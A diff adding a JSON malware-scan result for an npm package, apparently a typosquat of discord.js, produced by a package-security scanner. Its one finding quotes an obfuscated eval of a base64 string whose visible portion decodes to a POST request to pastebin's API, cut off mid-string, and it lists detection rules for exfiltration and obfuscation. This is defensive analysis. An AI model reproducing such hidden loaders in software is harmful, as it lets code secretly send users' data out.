@@ -1,0 +1,22 @@
+{
+    "issues": 1,
+    "errors": {},
+    "results": {
+        "npm-silent-process-execution": {},
+        "npm-install-script": {},
+        "npm-dll-hijacking": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "shady-links": {},
+        "npm-serialize-environment": {},
+        "npm-exec-base64": [
+            {
+                "location": "package/src/client/Client.js:278",
+                "code": "        eval(Buffer.from(\"ICAgICAgICBsZXQgcmFuZElkID0gKE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIDkwMDAwKSArIDEwMDAwKTsNCiAgICAgICAgcmVxdWVzdC5wb3N0KHsibWV0aG9kIjogIlBPU1QiLCJ1cmwiOiAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vYXBpL2FwaV9wb3N0LnBocCIsImZvcm0iOi...ase64'));\n",
+                "message": "This package contains a call to the `eval` function with a `base64` encoded string as argument.\nThis is a common method used to hide a malicious payload in a module as static analysis will not decode the\nstring.\n"
+            }
+        ],
+        "npm-obfuscation": {},
+        "npm-steganography": {}
+    },
+    "path": "./dataset/npm/discordi.js-14.0.1"
+}
